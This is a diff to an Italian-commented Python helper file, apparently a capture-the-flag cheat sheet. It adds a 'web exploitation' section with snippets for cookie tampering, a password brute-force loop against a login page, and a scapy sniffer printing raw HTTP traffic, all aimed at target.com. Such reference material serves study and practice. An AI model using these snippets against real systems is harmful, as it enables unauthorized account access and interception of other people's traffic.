@@ -3,7 +3,7 @@ import string
 import math
 import binascii
 
-''' ------ FUNZIONI DI BASE -------------------------------------------- '''
+''' ------ ENCODING ---------------------------------------------------- '''
 
 # Funzione che legge interamente il contenuto di un file di testo
 # es. filename = "documento.txt"
@@ -188,6 +188,82 @@ def substitute(testo, sostituzioni):
         else:
             plain += c
     return plain
+
+''' -------------------------------------------------------------------- '''
+
+''' ------ WEB EXPLOITATION -------------------------------------------- '''
+''' MODIFICARE I COOKIES DI UNA PAGINA '''
+import requests
+
+# Creare una sessione per persistenza dei cookie
+session = requests.Session()
+
+# Effettua una richiesta per ottenere i cookie
+response = session.get('http://target.com')
+print(response.cookies)  # Leggere i cookie
+
+# Modificare e inviare i cookie in una successiva richiesta
+session.cookies.set('session', 'new_value')  # Impostare un valore di cookie
+response = session.get('http://target.com/another_page')
+print(response.text)
+''''''
+
+''' INVIARE UNA RICHIESTA POST '''
+import requests
+
+url = "http://target.com/login"
+data = {"username": "admin", "password": "password"}
+response = requests.post(url, data=data)
+
+print(response.text)
+''''''
+
+''' INVIARE UNA RICHIESTA GET '''
+headers = {
+    "User-Agent": "Mozilla/5.0",
+    "Authorization": "Bearer token123"
+}
+response = requests.get("http://target.com/secure", headers=headers)
+print(response.text)
+''''''
+
+''' INTERCETTARE RICHIESTE HTTP '''
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print("Richiesta GET ricevuta con percorso:", self.path)
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'Hello, world!')
+
+httpd = HTTPServer(('localhost', 8000), SimpleHTTPRequestHandler)
+httpd.serve_forever()
+''''''
+
+''' BRUTEFORCE ATTACK CON PAYLOAD PERSONALIZZATI '''
+import requests
+
+url = "http://target.com/login"
+possible_passwords = ["1234", "password", "admin"]
+
+for password in possible_passwords:
+    response = requests.post(url, data={"username": "admin", "password": password})
+    if "Login successful" in response.text:
+        print(f"Password trovata: {password}")
+        break
+''''''
+
+''' INTERCETTARE IL TRAFFICO HTTP '''
+from scapy.all import sniff
+
+# Filtra solo le richieste HTTP
+def packet_callback(packet):
+    if packet.haslayer('Raw'):  # Individua i dati raw nei pacchetti HTTP
+        print(packet['Raw'].load)
+
+sniff(filter="tcp port 80", prn=packet_callback, count=10)
+''''''
 
 ''' -------------------------------------------------------------------- '''
 
